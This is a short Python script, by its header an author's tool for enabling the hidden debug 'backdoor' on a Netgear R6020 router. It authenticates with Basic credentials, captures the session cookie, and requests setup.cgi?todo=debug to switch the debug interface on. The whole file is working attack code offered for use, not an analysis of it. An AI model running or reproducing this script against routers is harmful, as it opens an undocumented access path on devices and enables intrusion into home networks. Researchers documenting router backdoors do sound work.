#!/usr/local/bin/python3

'''
Author: 9lyph
Desc:   Enables debug (backdoor) on Netgear R6020 (Nighthawk)
'''

import requests

def getAuthCookie():

    headers = {
        "Host": "192.168.1.1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "DNT": "1",
        "Connection": "close",
        "Authorization": "Basic <!--Base64 creds to be place here in the following formate user:pass-->",
        "Upgrade-Insecure-Requests": "1"
    }

    url = "http://192.168.1.1/"
    r = requests.get(url, headers=headers, verify=False)
    authCookie = r.headers['Set-Cookie']
    return authCookie

def turnOnDebug(authCookie):
    url = "http://192.168.1.1/setup.cgi?todo=debug"

    headers = {
        "Host": "192.168.1.1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "DNT": "1",
        "Connection": "close",
        "Cookie": ""+authCookie,
        "Authorization": "Basic <!--Base64 creds to be place here in the following formate user:pass-->",
        "Upgrade-Insecure-Requests": "1"
    }
    r = requests.get(url, headers=headers, verify=False)
    print (r.text)

def main():
    authCookie = getAuthCookie()
    turnOnDebug(authCookie)

if __name__ == '__main__':
    main()
